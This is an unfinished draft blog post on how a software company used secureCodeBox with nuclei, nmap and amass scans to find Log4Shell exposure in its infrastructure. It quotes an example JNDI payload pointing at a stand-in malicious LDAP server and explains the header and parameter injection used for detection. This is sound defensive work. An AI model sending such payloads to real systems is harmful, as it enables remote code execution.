By now, you must have heard about Log4Shell, the present that ruined Christmas for many developers and IT specialists, whether naughty or nice. 
This blog describes how we used the secureCodeBox in our incident response process at Iteratec.

## A Brief Introduction To Log4Shell

But first, a small refresher: In late November 2021, a [zero-day vulnerability was discovered in the widely used Java logging library Log4J](https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/). It allowed attackers to remotely execute code through Java Naming Directory Index ([JNDI](https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface)) lookups to malicious LDAP servers: If an attacker can get the application to log a payload controlled by the attacker, like `{jndi:ldap//evil.ldap.server.adress/a}`, then the code hosted on the LDAP server would be loaded and executed by the program, effectively letting third parties take control of the Java Application and the server it's running on.

This vulnerability shook the IT world. It received a CVE rating of 10/10, and even the German government issued a statement calling for immediate action and described the issue as "critical". This is due to two main reasons. First, the vulnerability was relatively simple for attackers to exploit. Second, it has remained undiscovered since 2013, affecting many services from AWS to Minecraft.

At [Iteratec](https://www.iteratec.com), as a software development company, we had to assess our security posture as well - for both the infrastructure that we were running for ourselves, as well as the software we develop for our customers.
In this blog post, we describe how we leveraged the secureCodeBox as part of our incident response.

## Finding Affected Infrastructure
TODO: Add brief intro here.

### Testing For Vulnerabilities

Soon after the Log4Shell vulnerability became publicly known, the community of the [nuclei](https://github.com/projectdiscovery/nuclei) scanner published a [scan template](https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-44228.yaml) (the nuclei version of a scan rule, which describes declaratively how to test a host for the vulnerability) to detect the Log4Shell vulnerability.
This rule triggers a single HTTP request to the target with a single HTTP get request parameter set to include the JNDI attack payload. 
It also includes a large number of HTTP header each containing the same attack payload. 
If the server uses a vulnerable version of Log4J to log one of the parameters, the host will trigger a DNS lookup. 
Before the scan, nuclei registers a new endpoint on an [out-of-band (OOB) interaction service](https://github.com/projectdiscovery/interactsh), which will log all DNS lookup made to that unique domain name. 
Nuclei automatically confiures the JNDI attack payload to make the lookup on the domain name of the OOB endpoint. 
This gives a very effective way to discover the vulnerability with a very low chance for false positives.

Thought the false positive rate is very low, the detection rate can also be low, as the dynamic scans have to actually trigger the vulnerability correctly by passing the right parameters (e.g. `?foo=bar&baz=${jdni...})`), finding and using the correct endpoint (e.g. `/api/user/login`) or including a valid user token and session to access a restricted endpoint. 
All these things are potentially required to detect Log4Shell via dynamic scanners. 
Hence, if the scans do not give any results, it does not necessarily mean that no Log4J bug is present, but it can at least rule out the easy-to-find cases.

To use the Nuclei template in the secureCodeBox, we...
TODO: I would propose giving explicit instructions for how we pulled the template into the SCB
TODO: I would propose to give YAML versions of all of this so people can copy-paste and understand / see how easy it is to do this

### Building A Demo Target
We needed a test target to validate that our scanners effectively detect a Log4J vulnerability. Fortunately, secureCodebox already has the ideal resource for this use case: the *demo target*.
We use demo targets in SCB to continuously test the functionality of our scanners during the development cycles.
Our existing demo targets include the [bodgeit store](https://github.com/psiinon/bodgeit) and [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/).  
Integration tests are run against the demo targets during our CI/CD pipeline to spot any malfunctioning scanner.

Demo targets consist of a Kubernetes service containing a vulnerable application image.
Creating a new Log4J demo target is a straightforward process. First, a vulnerable docker image is required. 
Luckily, an image has been [provided by the GitHub user 'christophetd'](https://github.com/christophetd/log4Shell-vulnerable-app).  
Second, we must create our [helm chart folder](https://github.com/secureCodeBox/secureCodeBox/tree/main/demo-targets/vulnerable-log4j/templates) using the same directory structure as the other demo targets and configure it to use the vulnerable Log4J image. 
It is essential to [expose the demo target's service corresponding ports](https://github.com/secureCodeBox/secureCodeBox/blob/e4320e71f6c215213a91649a61cc361cf543d924/demo-targets/vulnerable-log4j/templates/deployment.yaml#L37-L40).
In this case, it is port 8080. And then we are essentially done. All that is left now is to install the demo target in the preferred namespace, as shown below:  

TODO: In the paragraph above, add example YAMLs (if we also do that in the other places).

```bash
helm upgrade --install vulnerable-log4j ./demo-targets/vulnerable-log4j/ --namespace <NAMESPACE>
```

After using the demo target to validate that the scanner works, we then proceeded to run it against our own infrastructure.

### Finding Hosts

To scan for the Log4Shell vulnerabilities dynamically we first have to identify what to scan.
Using the secureCodeBox we used the [cascading scanning mechanism](https://docs.securecodebox.io/docs/hooks/cascading-scans) to run an initial scan to discover scan targets and use their result to automatically start scans for the identified hosts and domains.
We used two different different discovery methods:

1. For hosts in the internal networks, we used the secureCodeBox `nmap` scanType to scan for hosts and open ports in our internal IP ranges (e.g. 10.42.0.0/16). Every port which nmap identified to be related to http(s) (which is generally the easiest protocol to scan for Log4Shell even thought it can also be exploitable via different protocols) was used as a target in a Log4Shell scans.
2. For publicly available hosts, we used the `amass` scanType to find subdomains for the list of domain names we own as a company. This outputs a list of a subdomains which we then use to automatically trigger `nmap` scans to find open http(s) ports for the actual Log4Shell vulnerability assessment.

After enumerating the targets, we triggered the actual Nikto scans using another cascading rule.

## Finding Affected Code
(As a software company, we not only have our own infrastructure, but we are also producing code that we need to check for vulnerabilities. We have already described how to do this in a previous blogpost, in this case we used rules developed by Kurt Boberg and shared on the semgrep slack. I'm not sure we actually need to go into great detail since it is pretty much identical to the previous blog post about SAST, so we may only need to highlight the differences if there are any, and I don't think there are.)

## Conclusion

(Conclusion goes here.)
We are looking forward to hearing your own stories and ideas for using secureCodeBox - [find us on Slack][scb-slack] or [GitHub][scb-repo] to get in touch.
